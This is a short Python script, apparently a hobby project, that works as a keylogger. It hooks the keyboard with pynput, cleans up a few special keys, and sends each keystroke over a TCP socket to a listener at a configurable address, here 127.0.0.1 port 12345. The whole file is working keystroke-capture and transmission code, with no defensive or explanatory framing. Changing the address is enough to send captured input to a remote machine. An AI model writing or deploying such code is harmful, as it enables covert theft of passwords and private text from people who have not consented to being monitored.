import os, socket
from pynput.keyboard import Listener

def sender(message):
    print(f"➜ {message}")
    adresseIP = "127.0.0.1"
    port = 12345
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((adresseIP, port))
    print("Connection established.")
    client.send(message.encode("utf8"))
    print("Connection closed.")
    client.close()

def log_keystroke(key):
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
    sender(key)

with Listener(on_press=log_keystroke) as l:
    l.join()
